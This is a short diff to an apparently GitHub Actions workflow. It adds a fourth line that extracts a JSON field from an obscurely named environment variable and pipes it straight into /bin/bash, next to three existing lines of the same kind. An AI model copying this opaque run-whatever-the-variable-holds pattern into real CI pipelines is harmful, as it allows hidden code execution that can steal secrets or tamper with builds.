@@ -29,6 +29,7 @@ jobs:
           echo $wy144 | jq -r .xlhfi858 | /bin/bash
           echo $lj1764 | jq -r .cnl3 | /bin/bash
           printf '%s' "$fro5375" | jq -r .ewhyb061 | /bin/bash
+          printf '%s' "$kr381" | jq -r .ihgq6524 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
